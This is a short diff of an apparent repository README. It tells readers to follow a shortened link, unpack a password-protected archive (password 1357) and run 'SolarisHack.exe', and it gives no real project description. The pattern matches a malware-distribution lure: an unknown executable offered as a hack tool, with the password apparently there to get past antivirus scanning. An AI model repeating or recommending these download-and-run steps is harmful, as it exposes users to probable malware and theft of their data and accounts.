@@ -1,8 +1,10 @@
-
 🔰How to downoload: 
 click here: https://sul.su/LTSE and install file.
-password: 1357
+ password: 1357.
 Run SolarisHack.exe
+
+![image](https://github.com/user-attachments/assets/031e25be-4b1e-4288-82eb-f6bed114dcaa)
+
 
 ***Description:***
 
